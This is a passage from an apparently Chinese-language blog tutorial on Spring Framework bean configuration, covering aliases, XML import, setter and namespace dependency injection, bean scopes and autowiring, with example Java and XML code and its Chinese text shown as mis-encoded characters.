<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">User user = (User) context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">User user2 = (User)context.getBean(<span class="string">&quot;user&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>ä¸¤è€…æ˜¯æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>æ‰€ä»¥åœ¨é…ç½®æ–‡ä»¶åŠ è½½çš„æ—¶å€™ï¼Œå®¹å™¨ä¸­ç®¡ç†çš„å¯¹è±¡å°±å·²ç»åˆå§‹åŒ–äº†</p>
<h1 id="3-Springé…ç½®"><a href="#3-Springé…ç½®" class="headerlink" title="3. Springé…ç½®"></a>3. Springé…ç½®</h1><h2 id="3-1-åˆ«å"><a href="#3-1-åˆ«å" class="headerlink" title="3.1 åˆ«å"></a>3.1 åˆ«å</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">alias</span> <span class="attr">name</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;dnm&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨è¿™æ ·å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªåˆ«åé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userT2&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    User user = (User) context.getBean(<span class="string">&quot;user2&quot;</span>);</span><br><span class="line">    User user2 = (User)context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    System.out.println(user==user2);</span><br><span class="line">    user.show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•åæ˜¯ä¸€æ ·çš„</p>
<p>è€Œä¸”åˆ©ç”¨nameçš„æ–¹å¼å¯ä»¥èµ·å¤šä¸ªåˆ«å</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user2,u2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="3-2-Beançš„é…ç½®"><a href="#3-2-Beançš„é…ç½®" class="headerlink" title="3.2 Beançš„é…ç½®"></a>3.2 Beançš„é…ç½®</h2><h2 id="3-3-import"><a href="#3-3-import" class="headerlink" title="3.3 import"></a>3.3 import</h2><p>importä¸€èˆ¬è¢«æˆ‘ä»¬ç”¨äºä½¿ç”¨å›¢é˜Ÿå¼€å‘ä½¿ç”¨ï¼Œå®ƒå¯ä»¥å°†å¤šä¸ªé…ç½®æ–‡ä»¶å¯¼å…¥åˆå¹¶ä¸ºä¸€ä¸ªï¼Œæ–¹ä¾¿ç¨‹åºå‘˜ä¹‹é—´äº’ç›¸åä½œã€‚</p>
<p>ä¾‹å¦‚æˆ‘å…ˆåˆ›å»ºäº†å¦‚ä¸‹ä¸‰ä¸ªé…ç½®çš„xmlï¼š</p>
<p>beans1.xml ,applicationContext.xml ä»¥åŠbeans.xml</p>
<p>åœ¨mainå‡½æ•°å½“ä¸­æˆ‘å´åªæƒ³ä½¿ç”¨ä¸€ä¸ªï¼Œè¯¥å¦‚ä½•æ“ä½œå‘¢ï¼Ÿï¼Œè¿™æ ·æˆ‘ä»¬åº”è¯¥ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans.xml&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans1.xml&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åå†å›åˆ°Mytestå½“ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±ç›¸å½“äºä¸€å£æ°”ç»„ç»‡äº†ä¸‰ä¸ªxmlæ–‡ä»¶</p>
<p>åŒæ—¶å†å›åˆ°å‰é¢çš„åˆ«åçš„ä½¿ç”¨ï¼Œè¿™æ ·çš„åˆ«åä¾¿äºæˆ‘ä»¬importåˆå¹¶çš„æ—¶å€™å°†ä»–ä»¬åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¼šé˜»æ­¢é‡å¤çš„æƒ…å†µ</p>
<h1 id="4-ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰"><a href="#4-ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰" class="headerlink" title="4 ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰"></a>4 ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰</h1><h2 id="4-1-æ„é€ å™¨æ³¨å…¥"><a href="#4-1-æ„é€ å™¨æ³¨å…¥" class="headerlink" title="4.1 æ„é€ å™¨æ³¨å…¥"></a>4.1 æ„é€ å™¨æ³¨å…¥</h2><p>å‰é¢å·²ç»è¯´è¿‡</p>
<h2 id="4-2-SETæ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘"><a href="#4-2-SETæ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘" class="headerlink" title="4.2 SETæ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘"></a>4.2 SETæ–¹å¼æ³¨å…¥ã€é‡ç‚¹ã€‘</h2><ul>
<li>ä¾èµ–æ³¨å…¥ï¼šæœ¬è´¨å°±æ˜¯setæ³¨å…¥ï¼<ul>
<li>ä¾èµ–ä»€ä¹ˆï¼Ÿ<ul>
<li>beanå¯¹è±¡çš„åˆ›å»ºä¾èµ–äºå®¹å™¨</li>
</ul>
</li>
<li>æ³¨å…¥ä»€ä¹ˆï¼Ÿ<ul>
<li>beanå¯¹è±¡ä¸­çš„æ‰€æœ‰å±æ€§ç”±å®¹å™¨æ¥æ³¨å…¥</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>å…³äºå¤æ‚ç±»å‹ä¹‹å‰ï¼Œæˆ‘ä»¬æœ‰å¿…è¦æ˜ç™½listï¼Œsetï¼Œmapéƒ½æ˜¯æ¥åšä»€ä¹ˆçš„ï¼Œä»¥åŠä»–ä»¬çš„åŒºåˆ«</p>
<p>è¯¦ç»†æˆ‘å†³å®šå†™åœ¨JAVAåŸºç¡€é‡Œé¢ã€‚</p>
<p>ã€ç¯å¢ƒæ­å»ºã€‘</p>
<p>1.å¤æ‚ç±»å‹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Address</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAddress</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>2.çœŸå®æµ‹è¯•å¯¹è±¡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String[] books;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Student&gt; hobbies;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; cards;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games;</span><br><span class="line">    <span class="keyword">private</span> String wife;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br></pre></td></tr></table></figure>

<p>è¿™äº›å¯¹è±¡çš„å„ç§æ³¨å…¥æ–¹æ³•ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        Beanæ³¨å…¥ï¼Œä½¿ç”¨ref--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;address1&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;books&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JavaåŸºç¡€<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>Javaè¿›ç¨‹<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>Javaç¼–å†™<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JavaIOC<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>JavaSpring<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cards&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;æœˆæ›œ&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1751111&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;æœˆçŸ³&quot;</span> <span class="attr">value</span>=<span class="string">&quot;138217&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;games&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>æˆ˜åœ°<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>ä½¿å‘½å¬å”¤<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>EA<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>å¥¥é‡Œç»™<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>å”±æ­Œ<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>ä¸‹æ£‹<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>ç¡è§‰<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;url&quot;</span>&gt;</span>/weibos?SSL=xxx<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;divers&quot;</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;username&quot;</span>&gt;</span>æœˆçŸ³<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;password&quot;</span>&gt;</span>æœˆæ›œ<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;wife&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘åœ¨è¿™é‡Œè§‰å¾—æ¯”è¾ƒé‡è¦çš„åŒºåˆ«å°±æ˜¯åœ¨äºpropå’Œmapå½“ä¸­çš„å·®åˆ«</p>
<p>mapå› ä¸ºå¼ºè°ƒçš„æ˜¯é”®å€¼å¯¹å…³ç³»ï¼Œæ‰€ä»¥å†™åœ¨mapçš„æ ‡ç­¾å½“ä¸­ï¼Œè€Œpropä¸­çš„å€¼å®¹æ˜“ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™åœ¨æ ‡ç­¾ä¸­é—´ã€‚</p>
<p>æ€»è€Œè¨€ä¹‹è®°ä½å°±å¥½äº†         </p>
<p>æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Student&#123;address=Address&#123;address=&#x27;å®‰å¾½èŠœæ¹–ä¸­å‡º&#x27;&#125;, name=&#x27;æœˆçŸ³&#x27;,</span><br><span class="line">books=[JavaåŸºç¡€, Javaè¿›ç¨‹, Javaç¼–å†™, JavaIOC, JavaSpring],</span><br><span class="line">hobbies=[å”±æ­Œ, ä¸‹æ£‹, ç¡è§‰], </span><br><span class="line">cards=&#123;æœˆæ›œ=1751111, æœˆçŸ³=138217&#125;, </span><br><span class="line">games=[æˆ˜åœ°, ä½¿å‘½å¬å”¤, EA, å¥¥é‡Œç»™], wife=&#x27;null&#x27;, </span><br><span class="line">info=&#123;password=æœˆæ›œ, url=/weibos?SSL=xxx, divers=mysql, username=æœˆçŸ³&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="4-3-æ‹“å±•æ–¹å¼æ³¨å…¥"><a href="#4-3-æ‹“å±•æ–¹å¼æ³¨å…¥" class="headerlink" title="4.3 æ‹“å±•æ–¹å¼æ³¨å…¥"></a>4.3 æ‹“å±•æ–¹å¼æ³¨å…¥</h2><p>é™¤äº†ä¸Šé¢çš„ä¾èµ–æ³¨å…¥ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨På‘½åç©ºé—´å’ŒCå‘½åç©ºé—´æ³¨å…¥ï¼Œä½†æ˜¯ä»–ä»¬å¿…é¡»åˆ©ç”¨XMLçº¦æŸã€‚</p>
<p>å…·ä½“ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æœˆçŸ³&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;20&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">id</span>=<span class="string">&quot;user2&quot;</span> <span class="attr">p:age</span>=<span class="string">&quot;20&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;æœˆæ›œ&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user3&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span> <span class="attr">c:age</span>=<span class="string">&quot;21&quot;</span> <span class="attr">c:name</span>=<span class="string">&quot;æœˆç¬™&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ClassPathXmlApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean2.xml&quot;</span>);</span><br><span class="line">    User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">    User user2 = context.getBean(<span class="string">&quot;user2&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">    System.out.println(user);</span><br><span class="line">    System.out.println(user2);</span><br><span class="line">    User user3 = context.getBean(<span class="string">&quot;user3&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">    System.out.println(user3);</span><br></pre></td></tr></table></figure>

<p>ï¼ˆæƒ³ä½¿ç”¨testè®°å¾—å¯¼å…¥junitå“¦</p>
<p>ç›¸åŒçš„ï¼Œä½¿ç”¨cæ ‡ç­¾å°±ç›¸å½“äºä½¿ç”¨æ„é€ å™¨å‘¢ã€‚</p>
<p>é‚£ä¹ˆç©ä»€ä¹ˆè¦ä½¿ç”¨cæ ‡ç­¾å’Œpæ ‡ç­¾å‘¢ï¼Ÿ</p>
<p>æˆ‘çŒœæƒ³æ˜¯å¦‚æœæˆ‘ä»¬å¯¹è¿™ç§ç®€å•çš„æ³¨å…¥æ–¹å¼ç»Ÿä¸€çš„ä½¿ç”¨æ ‡ç­¾æ¥è¿›è¡Œæ³¨å…¥ï¼Œè€Œå¤æ‚çš„ä½¿ç”¨propæ¥è¿›è¡Œæ³¨å…¥ï¼Œå¯ä»¥ç®€åŒ–æˆ‘ä»¬çš„ä»£ç ï¼Œå½“xmlç¹ççš„æ—¶å€™ä¹Ÿä¸è‡³äºä¸€å¡Œç³Šæ¶‚äº†æŠŠ</p>
<p>å®˜æ–¹æ–‡æ¡£ï¼š</p>
<p>namespace is not as flexible as the standard XML format. For example, the format for declaring property references clashes with properties that end in Ref, whereas the standard XML format does not. We recommend that you choose your approach carefully and communicate this to your team members, to avoid producing XML documents that use all three approaches at the same time.</p>
<p>æ„æ€æ˜¯ä¸å¤Ÿçµæ´»ï¼ŒåŒæ—¶éœ€è¦ä¸å›¢é˜Ÿæ²Ÿé€šå¥½ï¼Œä½†æ˜¯å¯ä»¥ç®€åŒ–ä»£ç ï¼Ÿ</p>
<h1 id="5-Beançš„ä½œç”¨åŸŸ"><a href="#5-Beançš„ä½œç”¨åŸŸ" class="headerlink" title="5 Beançš„ä½œç”¨åŸŸ"></a>5 Beançš„ä½œç”¨åŸŸ</h1><p>ä¸»è¦æ˜¯æ¢è®¨åŸå‹å’Œå•ä¾‹ä¹‹é—´çš„å·®è·ï¼š</p>
<ul>
<li><p>å•ä¾‹ï¼š</p>
<p>ä¹‹åæˆ‘ä»¬åˆ›å»ºçš„æ—¶å€™å³ä½¿åˆ›å»ºå¾ˆå¤šä¸ªç±»ï¼Œä¾ç„¶åªæœ‰ä¸€ä¸ªåŸå‹</p>
</li>
<li><p>å¤šä¾‹ï¼š</p>
<p>æ¯åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç±»</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;æœˆæ›œ&quot; scope&#x3D;&quot;prototype&quot;&#x2F;&gt;</span><br><span class="line">&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;æœˆæ›œ&quot; scope&#x3D;&quot;singleton&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">User user = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">       User user2 = context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">       System.out.println(user.hashCode());</span><br><span class="line">       System.out.println(user2.hashCode());</span><br><span class="line">       System.out.println(user==user2);</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç»“æœï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1075738627</span></span><br><span class="line"><span class="number">282828951</span></span><br><span class="line"><span class="keyword">false</span></span><br></pre></td></tr></table></figure>



<h1 id="6-Beançš„è‡ªåŠ¨è£…é…"><a href="#6-Beançš„è‡ªåŠ¨è£…é…" class="headerlink" title="6. Beançš„è‡ªåŠ¨è£…é…"></a>6. Beançš„è‡ªåŠ¨è£…é…</h1><ul>
<li>è‡ªåŠ¨è£…é…æ˜¯Springæ»¡è¶³beanä¾èµ–çš„ä¸€ç§æ–¹å¼ï¼</li>
<li>Springä¼šåœ¨ä¸Šä¸‹æ–‡ä¸­è‡ªåŠ¨å¯»æ‰¾ï¼Œå¹¶è‡ªåŠ¨ç»™beanè£…é…å±æ€§</li>
</ul>
<p>åœ¨Springä¸­æœ‰ä¸‰ç§è‡ªåŠ¨è£…é…çš„æ–¹å¼ï¼š</p>
<ol>
<li>åœ¨XMLä¸­æ˜¾å¼çš„é…ç½®</li>
<li>åœ¨Javaä¸­æ˜¾å¼çš„é…ç½®</li>
<li>éšå¼çš„è‡ªåŠ¨è£…é…beanã€é‡è¦ã€‘</li>
</ol>
<h2 id="6-1-æµ‹è¯•ç¯å¢ƒ"><a href="#6-1-æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="6.1 æµ‹è¯•ç¯å¢ƒ"></a>6.1 æµ‹è¯•ç¯å¢ƒ</h2><ol>
<li>ä¸€ä¸ªäººæœ‰ä¸¤æ¡ç‹—ï¼</li>
</ol>
<p>Catï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;miao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Dogï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wang&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Personï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Cat <span class="title">getCat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCat</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dog <span class="title">getDog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDog</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cat=&quot;</span> + cat +</span><br><span class="line">                <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>beans.xml:</p>
<p>byNameé…ç½®ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.Person&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span 